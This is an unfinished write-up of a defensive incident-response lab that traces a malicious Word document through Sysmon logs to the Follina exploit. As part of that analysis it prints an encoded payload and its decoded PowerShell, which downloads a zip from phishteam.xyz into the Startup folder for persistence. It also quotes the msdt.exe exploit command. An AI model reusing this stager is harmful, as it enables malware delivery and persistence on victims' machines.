# Tempest

## Introduction

This room is a capstone challenge for the SOC 1 learning path. 

### Task 3: Preparation - Tools and Artifacts
This task asks us to find the SHA256 hashes of the incident files. This is done with the Powershell command `Get-FileHash`

<img width="835" height="272" alt="image" src="https://github.com/user-attachments/assets/280cbf90-41fa-4ae0-b175-51f4a5d1a954" />

#### Task 3 Questions:
**What is the SHA256 hash of the capture.pcapng file?**
> CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

**What is the SHA256 hash of the sysmon.evtx file?**
> 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

**What is the SHA256 hash of the windows.evtx file?**
> D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

### Task 4: Initial Access - Malicious Document
We are investigating a CRITICAL severity alert. The analyst who escalated this alert has gathered some information for us:
- The malicious document has a .doc extension.
- The user downloaded the malicious document via chrome.exe.
- The malicious document then executed a chain of commands to attain code execution.

Additionally, the tasks has some notes for us:
- Start with the events generated by Sysmon.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.

#### Task 4 Questions:
**The user of this machine was compromised by a malicious document. What is the file name of the document?**
> free_magicules.doc

Searching for file creation events (Event ID 11) and file stream creation events (Event ID 15) near the start of the logs, we can find the events where the malicious file was downloaded.

**What is the name of the compromised user and machine?**
*Format: username-machine name*
> benimaru-TEMPEST

We can find this as the User field in the download events

**What is the PID of the Microsoft Word process that opened the malicious document?**
> 496

Looking for Process Create events (Event ID 1) shortly after the download, we can see the first event after the download was in fact a Microsoft Word process, and we can confirm that it opened the malicious file in the Command Line field

<img width="1068" height="209" alt="image" src="https://github.com/user-attachments/assets/6e069d3d-913c-4301-b12b-92c5fc99d4a5" />

**Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?**
> 167.71.199.191

Looking at the DNS query events (Event ID 22) just before the malicious file was downloaded, one of the requested domains stands out: `phishteam.xyz`. The IP that it resolves to is given in the Query Results field
<img width="577" height="186" alt="image" src="https://github.com/user-attachments/assets/d2b2f15f-6f66-49c0-86d1-939661592757" />

**What is the base64 encoded string in the malicious payload executed by the document?**
> JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

To find this, we filter for events with ParentProcessID matching the PID of the Microsoft Word process that opened the malicious document (496), and we can see 6 results. Looking through the results, one of the entries has `Invoke-Expression` and `FromBase64String`, indicating execution from an obfuscated string


**What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**
*Format: XXXX-XXXXX*
> 2022-30190

I had to search for the start of the command: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190

### Task 5: Initial Access - Stage 2 execution
Now we can decode the base64, and look at the commands that it executes:
`$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;`

Line by line:
`$app=[Environment]::GetFolderPath('ApplicationData')`: Set the AppData folder path to $app
`cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"`: Change working directory to the Startup folder
`iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip`: iwr is an alias for Invoke-WebRequest. This line downloads a payload from the same malicious domain we saw earlier
`Expand-Archive .\update.zip -DestinationPath .`: Extracts the contents of the zip file payload that was just downloaded
`rm update.zip`: Deletes the zip file

This set of commands downloads a zip file to the Startup folder, extracts it, and then deletes the original archive, leaving the extracted file in the Startup folder.

The task also gives us a few tips:
- The Autostart execution reflects explorer.exe as its parent process ID.
- Child processes of explorer.exe within the event timeframe could be significant.
- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.

#### Task 5 Questions:
**The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**
> C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

This is the path we found in the obfuscated string, we just had to replace $app with the full AppData path

**The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**
*Format: Remove the double quotes from the log.*
>

**Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**
>

**The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**
*Format: domain:port*
>

### Task 6: Initial Access - Malicious Document Traffic
#### Task 6 Questions:
### Task 7: Discovery - Internal Reconnaissance
#### Task 7 Questions:
### Task 8: Privilege Escalation - Exploiting Privileges
#### Task 8 Questions:
### Task 9: Actions on Objective - Fully-owned Machine
#### Task 9 Questions:







## Conclusion and Learning Outcomes
